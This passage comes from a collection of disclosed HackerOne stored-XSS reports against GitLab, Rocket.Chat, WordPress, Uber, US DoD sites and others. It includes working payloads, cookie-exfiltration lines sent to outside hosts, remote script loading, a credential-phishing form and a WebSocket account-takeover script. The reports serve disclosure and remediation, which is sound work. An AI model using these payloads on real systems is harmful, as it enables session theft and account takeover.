  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));

  const style1 = document.createElement('style');
  style1.innerHTML = rules;
  svg.insertBefore(style1, firstChild);
```

This leads to Cross-Site Scripting attack via following directive:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```
## Steps to reproduce

1. Create an issue in any repository
2. Create mermaid diagram with following payload:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

3. Save the issue. XSS will be triggered every time a user opens a page with this issue.

## PoC
Visit https://gitlab.com/bugbountyuser1/asdf/-/issues/3
You will see CSP errors in the console. 

{F1195539}

## What is the current *bug* behavior?

Mermaid fails to properly sanitize user-supplied input via directive which leads to XSS.

## What is the expected *correct* behavior?

Mermaid strips/encodes malicious characters, so there is no way to perform XSS attack.

## Output of checks

This vulnerability was tested on gitlab.com. CSP blocks XSS from executing, but I have an idea on how to bypass CSP.
On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.

### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)

## Impact

The Impact is standard as for any Stored XSS. User interaction is minimal - the user needs to navigate to a page with a Mermaid chart(issues page, etc). CSP is blocking XSS on gitlab.com, but I can work on XSS bypass if it is needed to show the impact/increase bounty amount. So let me know if you need CSP bypass too.

---

### [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040)

- **Report ID:** `1207040`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** X / xAI
- **Reporter:** @iambouali
- **Bounty:** - usd
- **Disclosed:** 2021-07-09T01:34:54.959Z
- **CVE(s):** -

**Summary (team):**

An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form. This XSS payload will execute in the context of an internal subdomain, allowing it to exfiltrate sensitive internal Twitter information.

---

### [Post-Auth Stored XSS with User Interaction leads to Remote Code Execution](https://hackerone.com/reports/1132202)

- **Report ID:** `1132202`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @sonarsource
- **Bounty:** - usd
- **Disclosed:** 2021-06-30T10:55:20.602Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Unsafe usage of the `toastr` library leads to Stored XSS when combined with a validation bypass in the `createRoom` function. Targeting an admin account leads to Remote Code Execution.

**Description:**
The frontend uses the `toastr` library to display error messages to the user. However, it is used in an unsafe way which allows XSS when user input is reflected in an API error message. This happens for example when channel info is edited and the channel's name contains invalid characters.

To abuse this, an attacker can use a validation bypass in [the `createRoom` function](https://github.com/RocketChat/Rocket.Chat/blob/9bbf11ad53d43dc3a5d870d6df4a3022b6de3440/app/lib/server/functions/createRoom.js#L62): the `extraData` parameter is merged with the room object without proper validation, which allows an attacker to override all previous properties such as the name or the owner. The attacker can use this to create a room that contains their XSS payload in the room's name.

Triggering the XSS requires multiple steps of user interaction, because there are few API endpoints that reflect user input back. One of them is [the `rooms.saveRoomSettings` endpoint](https://github.com/RocketChat/Rocket.Chat/blob/9bbf11ad53d43dc3a5d870d6df4a3022b6de3440/app/api/server/v1/rooms.js#L340-L348) which calls [the `saveRoomSettings` method](https://github.com/RocketChat/Rocket.Chat/blob/9bbf11ad53d43dc3a5d870d6df4a3022b6de3440/app/channel-settings/server/methods/saveRoomSettings.js#L223-L322) which in turn uses [the `getValidRoomName` function](https://github.com/RocketChat/Rocket.Chat/blob/9bbf11ad53d43dc3a5d870d6df4a3022b6de3440/app/utils/lib/getValidRoomName.js#L7-L62). This function checks the room's name and reflects the user-provided value back if it is not a valid name.

The error returned by the API is unsafely handled by passing it to the `toastr` library without escaping it or using the library's `escapeHtml` option. [The `handleError` function](https://github.com/RocketChat/Rocket.Chat/blob/9bbf11ad53d43dc3a5d870d6df4a3022b6de3440/app/utils/client/lib/handleError.js#L7-L33) passes the value to the `toastr` library, it escapes the `details` property but not the `message` and `title` property.

To gain Remote Code Execution capabilities on the server, an attacker can follow these steps to take over an admin account. The attacker can then use the newly gained admin privileges to create an incoming web hook that has a script. This allows them to execute commands or get a shell on the server, because the script is executed on the server without a security boundary in place (which seems to be intended).

**Note:** This issue is classified as Stored XSS because the payload is stored permanently in the database, but it could be argued that it is Reflected XSS because the payload is reflected by the API which then leads to the unsafe handling and execution of the payload.

## Releases Affected:
We tested on 3.12.1, but it is hard to confirm since when Rocket.Chat is vulnerable because there are many parts of the code base involved.

## Steps To Reproduce (from initial installation to vulnerability):
1. Set up an instance of RocketChat 3.12.1, e.g. by cloning the repo and using Docker Compose:
  1. `git clone git@github.com:RocketChat/Rocket.Chat.git`
  1. `cd Rocket.Chat`
  1. `git checkout tags/3.12.1`
  1. `docker-compose up -d`
1. Configure the instance with default settings
1. Create a normal (non-admin) user with username `attacker` and password `attacker`
1. Log in as the `attacker` user
1. Open the browser's developer tools and execute the following line of code: `Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })`
1. Invite the admin to the newly created channel
1. Log out and log in as an admin
1. Edit the title of the newly created channel (e.g. change `me` to `you`)
1. Click the save button
1. A dialog should pop up that shows the site's origin (e.g. http://localhost:3000), confirming that the XSS payload has been executed (this is only for the demo, the payload can be arbitrary JavaScript code)
1. (The demo ends here but it is trivial to get RCE capabilities when having access to an admin account, as explained before)

## Supporting Material/References:
The attached video shows the exploitation of the vulnerability with the attacker's view on the right and the victim's view (admin) on the left.

## Suggested mitigation
- Restrict and validate the `extraData` parameter when creating a room
- Use the `toastr` library with the `escapeHtml` option or sanitize the message and title manually
- Set a [`Content-Security-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) that prevents payload execution
  - preventing inline scripts might not be enough here because users can upload files
  - a [nonce-based CSP](https://content-security-policy.com/nonce/) would fit best

## Disclosure Policy
All reported issues are subject to a 90 day disclosure deadline.
After 90 days elapse, parts of the bug report will become visible to the public.

Don't hesitate to ask if you have any questions or need further help with this issue.

## Impact

An attacker can use this vulnerability to target an admin user and take over their account, which is already a high impact. The attacker can then use certain features that are available to admins in order to gain Remote Code Execution capabilities.

This gives them complete control over the Rocket.Chat instance and exposes all attached components, e.g. the database or any external system whose credentials are stored within Rocket.Chat settings. An attacker can read, change, or delete all items in the database, impacting confidentiality, integrity, and availability.

---

### [Account takeover via XSS](https://hackerone.com/reports/735638)

- **Report ID:** `735638`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @sectex
- **Bounty:** - usd
- **Disclosed:** 2021-03-31T08:30:49.240Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.

**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. 
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
```
results in:
```html
<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
```

To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.16.2
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

In this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.

Code (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):
```javascript
    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
    ws.onmessage = function (evt) {
        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"pong\\"}"]');
        }
        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
        }
        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
        }
    };
```
Payload (replace `sectex.dev\x2ffiles\x2fcswsh.js`):
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```

## Supporting Material/References:

  * {F631806}

## Suggested mitigation

  * Fix initial XSS

## Impact

* Attackers can execute scripts which can lead to:
    * Account takeover
    * Abitrary file read in Rocket.Chat-Desktop
    * RCE in Rocket.Chat-Desktop (#276031)

**Summary (team):**

An XSS was reported combining AutoLinker and Markdown. By combining AutoLinker and Markdown one could trick the parser into breaking out of the current HTML attribute, resulting in i.a. the possibility to obtain the login-token of a user.
An initial attempt to fix the problem did not successfully mitigate the problem, as the reporter was able to continue the exploit with minor adjustments.
The reporter suggested various mitigation strategies.
a fix was then released for version 3.11, 3.10.5, 3.9.7, 3.8.8.

---

### [Blind Stored XSS Payload fired at the backend on https://█████████/](https://hackerone.com/reports/1051369)

- **Report ID:** `1051369`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:31:30.535Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I have just gotten an email notification from my XSSHunter payload that my blind stored XSS has been triggered by an administrator on the █████████ site, in the following URL:

```javascript
https://█████/████
```

Admin IP address: 
████████

User-Agent:
█████████

Cookies:
```javascript
██████
```
Injection Image:

███████

DB Creds exposed:

██████████.█████\█████a

## Suggested Mitigation/Remediation Actions

Sanitizing the input on the back-end as well

##Best Regards
nagli

## Impact

Ability to capture administrator action when preforming activities on the back-end.
Extractions of DB credentials.
Access to private information.
Stealing the cookies of the administrator.

---

### [Blind Stored XSS on https://█████████ after filling a request at https://█████](https://hackerone.com/reports/1017189)

- **Report ID:** `1017189`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:55:55.396Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

When you submit a request at https://██████████, the content is being sent to the administrators of the application, and you will be presented with your request status at https://████

The Description field at the request status page is prone to stored xss and blind stored XSS injection, because there is no sanitization on the input being inserted.

As for now this is self (because the link is for the account), i'm 100% sure that when an administrator will check the request his details will get sent to my email, and i have a xss payload stored on my user.

████████

## Step-by-step Reproduction Instructions

1. Register to https://██████████ / login to my account (████)
2. Navigate to https://███
3. Craft your XSS payload on the description window
4. Submit your request
5. Navigate to https://█████████
6. The javascript will execute.

## Suggested Mitigation/Remediation Actions
Sanitizing the input being inserted into the description window field.

##Best regards
nagli

## Impact

Stored blind XSS  on the pac.whs.mil website which could lead to administrator credentials being leaked.

---

### [Stored XSS through name / last name on https://██████████/](https://hackerone.com/reports/1072616)

- **Report ID:** `1072616`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:53:52.354Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
There is stored XSS Vulnerability on https://█████/██████ by rendering unsafe input being registered on the account name and last name.

███


## Step-by-step Reproduction Instructions

1. Navigate to 
```javascript
https://█████/login/?next=/███%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252F████████%252Fcgi%252Flogin.cgi%253Freturn_to%253Dhttps%25253A%25252F%25252F███████%25252Fcgi%25252Fmyaccount.cgi%26client_id%3D6G3AXPQNPXK5SVESYCB8AMCPHQQ3ENCRK8G2QNWY%26state%3DBEAEb6NGMQ7kWZwZS2pNNFv4p7JwBk86%26scope%3Dopenid%2520profile
```
2. Create your account, with your name as <IMG SRC=X ONERROR=ALERT(1)>
3. Log in and navigate to https://███/██████

## Suggested Mitigation/Remediation Actions

Sanitizing the input on the account name fields will prevent the issue.

##Best Regards
nagli

## Impact

Executing javascript on behalf of the victim

---

### [Blind Stored XSS on ███████  leads to takeover admin account](https://hackerone.com/reports/1110243)

- **Report ID:** `1110243`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hemantsolo
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:46:21.071Z
- **CVE(s):** -

**Vulnerability Information:**

##Hello Team,
I am Hemant Patidar working as a security researcher and I found a bug in your site.
Report of bug is as follows:-

##Vulnerable URL:
https://████████/

##Description:
I have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.

POC: 
XSS Hunter report attached.

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customers and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to the URL by opening your account: https://█████/█████████
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />
3. Now wait for some time you will get an XSS fire email via XSS hunter along with the screenshot and other sensitive info.

## Suggested Mitigation/Remediation Actions

---

### [[First 30] Stored XSS on login.uber.com/oauth/v2/authorize via redirect_uri parameter](https://hackerone.com/reports/392106)

- **Report ID:** `392106`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Uber
- **Reporter:** @corb3nik
- **Bounty:** 3000 usd
- **Disclosed:** 2021-02-25T22:30:57.293Z
- **CVE(s):** -

**Summary (team):**

Stored XSS execution at https://login.uber.com due to unsanitized user-supplied input passed through Privacy Policy URL.

---

### [[manage.jumpbikes.com] Blind XSS on Jump admin panel via user name](https://hackerone.com/reports/472470)

- **Report ID:** `472470`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Uber
- **Reporter:** @cablej
- **Bounty:** - usd
- **Disclosed:** 2021-02-23T23:45:51.765Z
- **CVE(s):** -

**Summary (team):**

By setting a user's name to an XSS payload, a user was able to inject JavaScript which was executed on the administrative panel for Jump bikes, allowing complete compromise of the panel, exposing user activity, personal information and billing information.

---

### [Stored XSS in wordpress.com](https://hackerone.com/reports/1054526)

- **Report ID:** `1054526`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @ucuping
- **Bounty:** - usd
- **Disclosed:** 2021-02-17T09:44:34.456Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello Team,
I found the Stored XSS vulnerability in the Custom Style section, this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.

## Platform(s) Affected:
wordpress.com

## Steps To Reproduce:
1. As an attacker, go to the feedback section, then go to the Polling section.
2. Add a new post or edit an existing post.
3. Scroll down, click All Styles.
4. Add a new Style.
5. Named the temporary style, click Save Style.
6. Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
7. Script will be run.
8. Invite the victim in a way, go to manage then users.
9. Click invite, enter username or email, and send.
10. As a Victim, accept the attacker's invitation.
11. Go to the Feedback section.
12. Then go to the Polling section.
13. Add a new post or edit an existing post.
14. Scroll down, click All Styles.
15. Enter the Style that has been created by the previous Attacker.
16. Script will be run.

## Supporting Material/References:
F1109567
F1109568
F1109569

## Impact

this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.

---

### [Stored XSS in Intense Debate comment system](https://hackerone.com/reports/1039750)

- **Report ID:** `1039750`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @hundredpercent
- **Bounty:** - usd
- **Disclosed:** 2021-02-14T16:29:23.546Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

## _Summary:_
The  Intense Debate comment system is vulnerable to stored xss by users , this would allow for atacking admins/users on the blog ,

## Platform(s) Affected:
*  Intense Debate comment system



________________________________________________________________________________________
________________________________________________________________________________________

## _Steps To Reproduce:_


  1. Go to **intensedebate.com/moderate/{{-ID-}}**
  2. Go to comments > allow images in comments
  3. Now go to your blog and add this payload as comment :

```html
<img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">
```
  4. You'll notice the alert will pop as result for the "onload" attribute ,
  

________________________________________________________________________________________
________________________________________________________________________________________


A helpful video :
{F1087899}

## Impact

* Stealing cookie and secter tokens 
* Editing html/css/js content for phishing attacks



Thanks for taking your valuable time to read and validate this report

---

### [Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover](https://hackerone.com/reports/847176)

- **Report ID:** `847176`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-10T21:07:10.472Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.

## Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Step-by-step Reproduction Instructions

1. Browse to https://█████
████████
2. Click `█████████`. Once on the ██████ page, click `███ and ████████`
██████████
3. Click `Continue`.
██████
4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.
███
5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.
█████████
7. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.
█████████
8. Click `██████`, or return to the `███████` page and put in your info in the `█████` area to modify the worksheet. The XSS will fire in both locations.
█████████
9. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:

```
<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
█████████
███

An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:
`<script>window.location="http://███/?cookie=" + document.cookie</script>`
██████

## Suggested Mitigation/Remediation Actions
Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

---

### [Stored XSS at https://www.█████████.mil](https://hackerone.com/reports/1081994)

- **Report ID:** `1081994`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @5050thepiguy
- **Bounty:** - usd
- **Disclosed:** 2021-02-01T17:48:48.502Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Stored XSS exists at https://www.██████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS. 

**Description:**
Stored XSS exists at https://www.████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS. 


## Impact
A user can steal cookies, deface a site, etc. 

## Step-by-step Reproduction Instructions

(1) Go to https://www.██████.mil/jppso/vendor/WFDPMMiscInvoicingDocuments.aspx
(2) Fill out the form, upload a file, and add the file
(3) Once the file is uploaded right click to get to the Developer Tools.
(4) Inspect the page and find the path for the file -- █████\file.txt. For example, the file path for the file I uploaded is as follows: https://www.██████.mil/jppso/vendor/Data/cme1rjjcnjhnvdzhf5lgfbge-01192021-065856_testing-new.html
(5) Observe that XSS is triggered.

## Product, Version, and Configuration (If applicable)
https://www.████████.mil
Tested in Firefox

## Suggested Mitigation/Remediation Actions

## Impact

Stored XSS exists at https://www.█████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS.

---

### [Blind stored XSS due to insecure contact form at https://█████.mil leads to leakage of session token and ](https://hackerone.com/reports/1036877)

- **Report ID:** `1036877`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ahmedelmalky
- **Bounty:** - usd
- **Disclosed:** 2021-01-25T19:53:39.164Z
- **CVE(s):** -

**Vulnerability Information:**

##Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here  https://███████.mil/  This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets. I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.
##Steps To Reproduce:
1-Browse to the page at https://██████.mil/and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field.
2-Submit the form and have and admin access the information.
3-This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event.

##Supporting Material/References:
(the screenshot )[██████████]

The IP address that triggered the XSS payload is  ████████ 

Xss hunter Report █████████

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

---

### [XSS in message attachment fileds.](https://hackerone.com/reports/899954)

- **Report ID:** `899954`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @fabianfreyer
- **Bounty:** - usd
- **Disclosed:** 2021-01-17T18:37:40.648Z
- **CVE(s):** CVE-2020-8288

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.

**Description:**

If no custom renderer is set, the `specializedRendering` function will render any HTML provided in the `value` field of the attachment:

```js
	specializedRendering({ hash: { field, message } }) {
		let html = '';
		if (field.type && renderers[field.type]) {
			html = Blaze.toHTMLWithData(Template[renderers[field.type]], { field, message });
		} else {
			// consider the value already formatted as html
			html = field.value;
		}
		return `<div class="${ field.type }">${ html }</div>`;
	},
```

## Releases Affected:

  * Rocket.Chat up to 3.3.3

## Steps To Reproduce (from initial installation to vulnerability):

1. Get an Personal Access Token.
2. Create a channel "#cookies"
3. Invite administrators into "#cookies", e.g. by promising them yummy cookies.
4. Put the following payload in a file, calling it `cookiesplz.json`:

    ```
    {
        "channel": "#cookies",
        "text": "Hi, I'd like a cookie please",
        "attachments": [
            {
                "text": "ohai",
                "fields": [
                    {
                        "type": "hello from project pwner",
                        "title": "pwn",
                        "value": "test<img src=x onerror='alert(document.cookie);'/>",
                        "short": false
                    }
                ]
            }
        ]
    }
   ```

5. Run the following curl request: `curl -H "X-Auth-Token: <Token>" -H "X-User-Id: <user Id>" -H "Content-type:application/json" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json`

## Supporting Material/References:

  * https://docs.rocket.chat/api/rest-api/methods/chat/postmessage#attachment-field-objects

## Suggested mitigation

  * Don't render verbatim HTML from user input.
  * Mitigate XSS using CSP headers.

## Impact

Using this vulnerability, an attacker can steal cookies of other users, including administrators to elevate their privileges. They can leak a user’s messages, critically impacting confidentiality. An attack payload may also Exit or delete messages, potentially removing traces of exploits and critically impacting integrity and availability. Finally, by escalating privileges, an attacker can restart the server and edit important settings, impacting availability. By using XSS execution, an attacker may send the payload to other users, i.e. this vulnerability is "wormable" on the same server.

In the electron client, this XSS can be used to get remote code execution.

---

### [Stored XSS on the job page](https://hackerone.com/reports/856554)

- **Report ID:** `856554`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @mike12
- **Bounty:** 3000 usd
- **Disclosed:** 2021-01-08T20:38:32.039Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Gitlab!

### Steps to reproduce:
1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
2. Create a new project with README.md
3. Go to Operations->Kubernetes
	1. Click on the "Add Kubernetes cluster" button
	2. Select the "Add existing cluster" tab
	3. Kubernetes cluster name: cluster-example
	4. API URL: https://google.com
	5. Service Token: token-example
	6. Uncheck the "GitLab-managed cluster" checkbox
	7. Click on the "Add Kubernetes cluster" button
4. Add ".gitlab-ci.yml" file to the repository (to the master branch)

    ```
    deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://google.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
    ```
5. Go to CI/CD->Jobs and open the last job
{F799680}
{F799681}

#### Vulnerable code

All vulnerable code is in one file [environments_block.vue](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue)

1. [Line 125](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L125)
2. [Line 156](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L156)
3. [Line 251](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L251)
4. And other places where `%{kubernetesNamespace}` is used

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

---

### [Blind XSS on image upload](https://hackerone.com/reports/1010466)

- **Report ID:** `1010466`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** CS Money
- **Reporter:** @benjamin-mauss
- **Bounty:** 1000 usd
- **Disclosed:** 2020-12-26T00:08:49.144Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

**Summary (researcher):**

This was my first report, so it is a little mess.

Let me explain: I found a XSS when I send a image in the support chat and change the image name to some script.

The CSRF part you can ignore, since the hacker can inject XSS in the support, then send a message (as support) with the XSS image to every user.
Yeah, it is a massive XSS, tons of users would be affected.

In the comments I explain I little better.

---

### [Store-XSS in error message of build-dependencies ](https://hackerone.com/reports/950190)

- **Report ID:** `950190`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2020-12-01T08:04:06.926Z
- **CVE(s):** CVE-2020-13340

**Vulnerability Information:**

Hi,

